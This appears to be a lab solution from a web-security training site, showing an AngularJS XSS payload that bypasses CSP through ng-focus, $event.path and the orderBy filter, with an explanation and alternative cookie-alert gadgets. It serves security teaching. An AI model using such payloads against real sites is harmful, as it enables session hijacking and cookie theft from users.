            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        <p>
                            Go to the exploit server and paste the following code, replacing <code>your-lab-id</code> with your lab ID:
                        </p>
                        <code class="code-scrollable">&lt;script&gt;
location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
&lt;/script&gt;</code>
                    </li>
                    <li>
                        Click "Store" and "Deliver exploit to victim".
                    </li>
                </ol>
                <p>
                    The exploit uses the <code>ng-focus</code> event in AngularJS to create a focus event that bypasses CSP. It also uses <code>$event</code>, which is an AngularJS variable that references the event object. The <code>path</code> property is specific to Chrome and contains an array of elements that triggered the event. The last element in the array contains the <code>window</code> object.
                </p>
                <p>
                    Normally, <code>|</code> is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the <code>orderBy</code> filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the <code>alert</code> function directly, we assign it to the variable <code>z</code>. The function will only be called when the <code>orderBy</code> operation reaches the <code>window</code> object in the <code>$event.path</code> array. This means it can be called in the scope of the window without an explicit reference to the <code>window</code> object, effectively bypassing AngularJS's <code>window</code> check.
                </p>
            </div>
        </div>

```javascript
// Reference
[].constructor.from([document.cookie],alert)
[document.cookie].map(alert)
(z=alert)(document.cookie)
```

